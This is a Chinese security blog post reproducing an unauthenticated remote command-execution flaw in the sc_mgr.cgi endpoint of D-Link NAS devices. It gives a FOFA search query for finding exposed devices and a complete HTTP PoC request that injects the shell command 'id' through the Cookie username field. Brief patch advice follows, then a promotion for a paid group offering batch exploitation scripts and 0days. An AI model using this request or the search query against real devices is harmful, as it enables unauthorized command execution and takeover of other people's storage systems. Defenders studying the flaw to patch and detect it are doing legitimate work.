#  「漏洞复现」D-Link NAS设备 sc_mgr.cgi 未授权漏洞   
冷漠安全  冷漠安全   2024-11-19 13:01  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
D-Link NAS设备是一种基于网络的存储解决方案，作为网络存储设备，旨在为企业提供大容量的存储空间，并通过网络连接实现数据的访问和管理。这种设备不仅满足了企业对数据存储的需求，还提供了高效的数据共享和访问功能，提升了企业数据管理的效率和灵活性。广泛应用于各种企业场景，如文档存储、图片和视频存储、数据库备份等。特别是在需要高效数据共享和访问的企业环境中，如设计工作室、广告公司、医疗机构等，D-Link NAS设备更是发挥了其强大的功能和优势。  
  
0x03  
  
**漏洞威胁**  
  
D-Link NAS设备 /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="/cgi-bin/login_mgr.cgi"  &&  body="cmd=cgi_get_ssl_info"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ruUrXMjkUsib97HAHBCdXRFmEVfFzhXHCf9ELphCHVQ3Hia7VKyBNjlw322jNCxamRB1kAWXXkLdicQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ruUrXMjkUsib97HAHBCdXRF35gWgFzWQZJ3VgGPewmmDDYDL46ksQpOvQ9ibLj1v6QoBVBmVLKJPIA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ruUrXMjkUsib97HAHBCdXRFJTQY0kckZBZ3x4iagPc1Fsu39Ek3gldlVfMic3KdApsohvxBu5GnczAg/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
应用补丁和更新： 用户应下载并安装 D-Link 提供的任何固件更新。  
  
限制网络访问： 作为临时措施，对 NAS 管理界面的网络访问应仅限于受信任的 IP 地址。  
  
监控固件更新： 受影响的设备用户应密切关注 D-Link 即将提供的任何安全补丁。  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ruUrXMjkUsib97HAHBCdXRF8oHYFian8HYKOxD5G4XaE4AyMtyjQG5a8P2mvsLwGaaUud4919fFS0w/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0ruUrXMjkUsib97HAHBCdXRFr7DSEvkicFibVdQpy85tjhFeVHsLL0lDkmBo9mDEdX50ObYFoDPrlXiag/640?wx_fmt=gif&from=appmsg "")  
  
  
